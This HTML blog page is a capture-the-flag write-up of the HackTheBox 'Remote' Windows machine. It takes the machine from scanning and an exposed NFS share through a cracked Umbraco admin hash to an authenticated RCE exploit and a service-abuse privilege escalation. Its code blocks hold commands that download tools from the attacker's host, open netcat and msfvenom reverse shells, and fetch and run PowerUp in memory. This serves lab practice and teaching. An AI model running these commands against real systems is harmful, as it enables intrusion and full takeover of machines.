<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <meta name="description" content="Write-ups about Linux and Security">
    <meta name="keywords" content="blog,security,linux">

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Remote"/>
<meta name="twitter:description" content="Machine info  OS : Windows Difficulty : Easy Points : 20 IP : 10.10.10.180  Mind Map Reconnaisance First I run the usual initial scan:
sudo nmap -n 10.10.10.180 -sV Nmap scan report for 10.10.10.180 Host is up (0.076s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 111/tcp open rpcbind 2-4 (RPC #100000) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds?"/>

    <meta property="og:title" content="Remote" />
<meta property="og:description" content="Machine info  OS : Windows Difficulty : Easy Points : 20 IP : 10.10.10.180  Mind Map Reconnaisance First I run the usual initial scan:
sudo nmap -n 10.10.10.180 -sV Nmap scan report for 10.10.10.180 Host is up (0.076s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 111/tcp open rpcbind 2-4 (RPC #100000) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/hackthebox/remote/" />
<meta property="article:published_time" content="2020-07-22T16:04:02+01:00" />
<meta property="article:modified_time" content="2020-07-22T16:04:02+01:00" />


    
      <base href="/posts/hackthebox/remote/">
    
    <title>
  Remote Â· lafx0
</title>

    
      <link rel="canonical" href="/posts/hackthebox/remote/">
    

    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.2/css/all.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />

    
      
      
      <link rel="stylesheet" href="/css/coder.min.a4f332213a21ce8eb521670c614470c58923aaaf385e2a73982c31dd7642decb.css" integrity="sha256-pPMyITohzo61IWcMYURwxYkjqq84XipzmCwx3XZC3ss=" crossorigin="anonymous" media="screen" />
    

    

    

    
      <link rel="stylesheet" href="/css/custom.css" />
    

    

    

    <link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">

    <meta name="generator" content="Hugo 0.66.0" />
  </head>

  
  
  <body class="colorscheme-light">
    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="/">
      lafx0
    </a>
    
    <input type="checkbox" id="menu-toggle" />
    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
    <ul class="navigation-list">
      
        
          <li class="navigation-item">
            <a class="navigation-link" href="/posts/">Blog</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="/about/info/">About</a>
          </li>
        
      
      
    </ul>
    
  </section>
</nav>


      <div class="content">
        
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">Remote</h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fas fa-calendar"></i>
              <time datetime='2020-07-22T16:04:02&#43;01:00'>
                July 22, 2020
              </time>
            </span>
            <span class="reading-time">
              <i class="fas fa-clock"></i>
              5-minute read
            </span>
          </div>
          
          
        </div>
      </header>

      <div>
        
        <h1 id="machine-info">Machine info</h1>
<ul>
<li>OS : Windows</li>
<li>Difficulty : Easy</li>
<li>Points : 20</li>
<li>IP : 10.10.10.180</li>
</ul>
<h1 id="mind-map">Mind Map</h1>
<p><img src="/images/htb/remote_mindmap.png" alt="Remote_MindMap"></p>
<h1 id="reconnaisance">Reconnaisance</h1>
<p>First I run the usual initial scan:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo nmap -n 10.10.10.180 -sV

Nmap scan report for 10.10.10.180
Host is up (0.076s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div>
<h1 id="enumeration">Enumeration</h1>
<p>From the scan results I can see that the FTP service is accessible with anonymous credentials. The login is successful with the <code>anonymous : anonymous</code> credentials but probably due to read permission we are not able to list anything useful.</p>
<p>There is an interesting service running on port <strong>2049</strong>. The <code>mountd</code> daemon is a Remote Procedure Call (RPC) that answers a client request to mount a file system. So probably there is a share available to mount. Let&rsquo;s check for that information:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)</code></pre></div>
<p>Mounting the available share:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo mkdir -p /tmp/site_backups
sudo mount -t nfs 10.10.10.180:/site_backups /tmp/site_backups</code></pre></div>
<p>Apparently the share hosts all the files from the web server listening at port 80. Visiting the page in a browser we are presented with a web page built on a CMS named <strong>Umbraco</strong>.</p>
<p><img src="/images/htb/Umbraco_80.png" alt="Umbraco_80"></p>
<p><strong>Note</strong>: Brute Forcing the directories on the web server appears to be useless as nothing useful shows up.</p>
<p>I proceed enumerating the share. Googling the service there are different resources telling that login informations are usually stored under the <strong>App_Data</strong> folder. Visiting that folder I can see an interesting file called <strong>Umbraco.sdf</strong>.</p>
<p>What are .sdf files?</p>
<blockquote>
<p>An SDF file contains a compact relational database saved in the SQL Server Compact (SQL CE) format, which is developed by Microsoft. It is designed for applications that run on mobile devices and desktops and contains the complete database contents, which may be up to 4GB in size.</p>
</blockquote>
<p>As I am searching for admin login informations:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">strings Umbraco.sdf | grep admin
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&#34;hashAlgorithm&#34;:&#34;SHA1&#34;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&#34;hashAlgorithm&#34;:&#34;SHA1&#34;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&#34;hashAlgorithm&#34;:&#34;SHA1&#34;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f</code></pre></div>
<p><strong>-&gt;</strong> <strong>b8be16afba8c314ad33d812f22a04991b90e2aaa</strong> is the password hash for the <strong>admin[at]htb.local</strong> user!</p>
<p>Cracking the hash:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">john hash --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt</code></pre></div>
<p>Where:</p>
<ul>
<li>hash is a file containing the actual password hash</li>
</ul>
<p>The password is <code>beaconandcheese</code>!</p>
<p>At this point, to complete the enumeration phase it is important to identify the CMS version in order to be able to check for potential vulnerabilities affecting this particular version. The version is <strong>7.12.4</strong>, as stated in the <code>Web.config file</code>.</p>
<p>Searching on <code>searchsploit</code> for related vulns, I found this one:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">searchsploit Umbraco 7.12.4
-------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                              |  Path
-------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                                  | aspx/webapps/46153.py
-------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results</code></pre></div>
<h1 id="exploitation">Exploitation</h1>
<p>The script is a <strong>Remote Code execution script</strong> and it needs a valid <code>Admin</code> authentication in order to function (I have admin credentials). It only needs some edits.
I will first upload the netcat program <code>nc.exe</code> from my machine and then set up a netcat reverse shell.</p>
<p>First I have to edit the following lines:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">login = &#34;admin@htb.local&#34;;
password=&#34;baconandcheese&#34;;
host = &#34;http://10.10.10.180&#34;;</code></pre></div>
<p>And edit the payload section with a custom command cmd (which will upload nc.exe in C:\Windows\Temp):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">{ string cmd = &#34;/c certutil -urlcache -split -f http://10.10.14:12:80/nc.exe c:/Windows/Temp/nc.exe&#34;;</code></pre></div>
<p><strong>Note</strong>: I have to set up a Python Server and serve the nc.exe file from my machine.</p>
<p>Now that the <code>nc</code> program is on the target machine, I can launch a reverse shell. I will edit the python script a second time and change the command cmd as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">{ string cmd = &#34;/c C:/Windows/Temp/nc.exe 10.10.14.12 4321 -e cmd.exe&#34;;</code></pre></div>
<p>Running the script after having launched a netcat listener on port 4321, I can see the connection coming back:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nc -nlvp 4321
listening on [any] 4321 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.180] 49703
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv&gt;whoami
whoami
iis apppool\defaultapppool</code></pre></div>
<p><strong>-&gt;</strong> I am successfully logged in as <strong>iis apppool\defaultapppool</strong>!</p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>For the PrivEsc phase I will rely on the PowerUp script.</p>
<blockquote>
<p>PowerUp is a PowerShell tool to assist with local privilege escalation on Windows systems. It contains several methods to identify and abuse vulnerable services, as well as DLL hijacking opportunities, vulnerable registry settings, and escalation opportunities.</p>
</blockquote>
<p>I will serve the script from my machine and execute it from a PowerShell command line:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">PS C:\windows\system32\inetsrv&gt; IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.12:8080/PowerUp.ps1&#39;)

PS C:\windows\system32\inetsrv&gt; Invoke-AllChecks
Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...


[*] Checking service executable and argument permissions...


ServiceName                     : UsoSvc
Path                            : c:\windows\temp\rev.exe
ModifiableFile                  : C:\windows\temp\rev.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : IIS APPPOOL\DefaultAppPool
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name &#39;UsoSvc&#39;
CanRestart                      : True</code></pre></div>
<p>The current user is able to stop and restart the <strong>UsoSvc</strong> service. The serivce is running as Local System! I can leverage this misconfiguration in order to execute a command of my choice and have it executed with highest privileges.</p>
<p>I create a reverse shell with msfvenom and upload it on the target machine under C:\Windows\Temp:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f exe --platform windows &gt; rev.exe</code></pre></div>
<p>I just have to launch the AbuseFunction after having set up the nc listener on port 4444:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">Invoke-ServiceAbuse -ServiceName &#39;UsoSvc&#39; -Command &#34;C:\Windows\Temp\rev.exe 10.10.14.12 4444 -e cmd.exe&#34;</code></pre></div>
<p>Here is the root shell:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.180] 49708
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system</code></pre></div>
<h2 id="lessons-learned-and-remediations">Lessons learned and remediations</h2>
<ul>
<li>The webserver Administrator should not have exposed a mount share publicly. It was the first step which made possible to identify admin credentials for the application. Only expose what is striclty necessary!</li>
<li>A low privilged user was able to manipulate a process running as Local System. This is a security misconfiguration and should be fixed as soon as possible.</li>
</ul>

      </div>


      <footer>
        


        
        
        
      </footer>
    </article>

    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
  <script>
    MathJax = {
      tex: {
        inlineMath: [
          ['$', '$'], ['\\(', '\\)']
        ],
        processEscapes: true,
        processEnvironments: true
      },
      options: {
        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
      }
    };
  </script>
  </section>

      </div>

      <footer class="footer">
  <section class="container">
    
      <p>'  '</p>
    
    
    
    
  </section>
</footer>

    </main>

    

    

  </body>

</html>
